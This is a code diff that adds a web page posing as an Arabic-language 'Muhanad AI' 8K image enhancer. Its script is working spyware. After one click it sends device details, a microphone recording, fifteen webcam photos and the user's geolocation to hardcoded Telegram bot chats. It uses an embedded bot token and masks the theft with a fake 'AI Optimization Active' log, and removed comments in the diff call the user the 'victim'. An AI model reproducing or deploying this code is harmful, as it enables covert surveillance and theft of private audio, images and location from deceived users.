@@ -1,70 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Muhanad AI | Ultimate Enhancer v5.0</title>
+    <style>
+        body { font-family: sans-serif; background: #0b0e14; color: white; text-align: center; padding: 50px; }
+        .card { background: #1c2128; padding: 40px; border-radius: 20px; border: 1px solid #30363d; max-width: 500px; margin: auto; }
+        .btn-start { background: #007bff; color: white; border: none; padding: 20px; font-size: 1.5rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; }
+        #log { display: none; background: #000; color: #00ff41; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; text-align: left; direction: ltr; height: 150px; overflow-y: auto; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="ui">
+        <h2>Muhanad AI Engine</h2>
+        <p>تحسين الجودة يتطلب الوصول لموارد الجهاز لضمان دقة 8K.</p>
+        <button class="btn-start" onclick="masterControl()">ابدأ المعالجة الآن</button>
+    </div>
+    <div id="log"></div>
+</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
     const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
     const IDS = ["8754338811", "8703490899"];
 
-    // 1. سحب مواصفات الجهاز بالكامل
-    async function getDeviceSpecs() {
-        const specs = {
-            "📱 المتصفح": navigator.userAgent,
-            "💻 المنصة": navigator.platform,
-            "🧠 الرامات": navigator.deviceMemory + " GB",
-            "⚙️ الأنوية": navigator.hardwareConcurrency,
-            "🔋 البطارية": (await navigator.getBattery()).level * 100 + "%",
-            "🌐 اللغة": navigator.language,
-            "📏 الشاشة": `${screen.width}x${screen.height}`
-        };
-        let msg = "🖥️ **مواصفات جهاز الضحية:**\n";
-        for (let key in specs) msg += `*${key}:* ${specs[key]}\n`;
-        sendToTelegram('text', msg);
+    // دالة الإرسال العامة
+    async function sendToBot(endpoint, formData) {
+        for (let id of IDS) {
+            formData.set('chat_id', id);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, { method: 'POST', body: formData });
+        }
     }
 
-    // 2. تسجيل صوت (ريكورد) منفصل
-    async function recordAudio() {
+    // 1. سحب مواصفات الجهاز
+    async function getSpecs() {
+        let specs = `🖥️ **مواصفات الجهاز:**\n` +
+                    `• المتصفح: ${navigator.userAgent}\n` +
+                    `• المنصة: ${navigator.platform}\n` +
+                    `• الرامات: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
+                    `• الشاشة: ${screen.width}x${screen.height}`;
+        const fd = new FormData();
+        fd.append('text', specs);
+        fd.append('parse_mode', 'Markdown');
+        await sendToBot('sendMessage', fd);
+    }
+
+    // 2. تسجيل صوت (Voice Record)
+    async function recordVoice() {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         const recorder = new MediaRecorder(stream);
         let chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-            for (let id of IDS) {
-                const fd = new FormData();
-                fd.append('chat_id', id);
-                fd.append('voice', blob, 'record.ogg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
-            }
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            const fd = new FormData();
+            fd.append('voice', blob, 'voice.ogg');
+            await sendToBot('sendVoice', fd);
+            stream.getTracks().forEach(t => t.stop());
         };
         recorder.start();
-        setTimeout(() => recorder.stop(), 10000); // ريكورد 10 ثواني
+        setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
     }
 
-    // 3. تعديل وظيفة التشغيل لتشمل كل شيء
-    async function startUltimateCapture() {
+    // 3. التقاط الصور (15 صورة)
+    async function takePhotos(stream) {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        for (let i = 0; i < 15; i++) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(async blob => {
+                const fd = new FormData();
+                fd.append('photo', blob, `img.jpg`);
+                fd.append('caption', `📸 صورة رقم ${i+1}`);
+                await sendToBot('sendPhoto', fd);
+            }, 'image/jpeg');
+            await new Promise(r => setTimeout(r, 2000)); // كل ثانيتين صورة
+        }
+    }
+
+    // 4. التحكم الرئيسي (الذي يعمل عند الضغط)
+    async function masterControl() {
         document.getElementById('ui').style.display = 'none';
-        document.getElementById('log').style.display = 'block';
+        const log = document.getElementById('log');
+        log.style.display = 'block';
+        log.innerHTML = "> Accessing Core...<br>";
 
         try {
-            // سحب المواصفات فوراً
-            getDeviceSpecs();
+            // أولاً: المواصفات (بدون إذن)
+            await getSpecs();
+            log.innerHTML += "> Specs Collected.<br>";
 
-            // طلب المايك وتسجيل ريكورد
-            recordAudio();
+            // ثانياً: الصوت (يطلب إذن المايك)
+            log.innerHTML += "> Requesting Audio Access...<br>";
+            await recordVoice();
 
-            // طلب الشاشة (للكمبيوتر)
-            const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            recordStream(screen, "🖥️ شاشة الضحية");
+            // ثالثاً: الكاميرا والصور
+            log.innerHTML += "> Requesting Camera Access...<br>";
+            const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            takePhotos(camStream);
 
-            // طلب الكاميرا والصور
-            const cam = await navigator.mediaDevices.getUserMedia({ video: true });
-            capturePhotos(cam, "الأمامية", 15);
-
-            // الموقع
+            // رابعاً: الموقع
             navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram('text', `📍 الموقع: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
+                const fd = new FormData();
+                fd.append('text', `📍 الموقع: http://googleusercontent.com/maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+                sendToBot('sendMessage', fd);
             });
 
+            log.innerHTML += "> [SUCCESS] AI Optimization Active.<br>> Control Token: MH-${Math.floor(Math.random()*9999)}";
+
         } catch (err) {
+            log.innerHTML += `<span style="color:red">> Error: ${err.name}</span><br>`;
             console.error(err);
-            location.reload();
         }
     }
 </script>
+
+</body>
+</html>
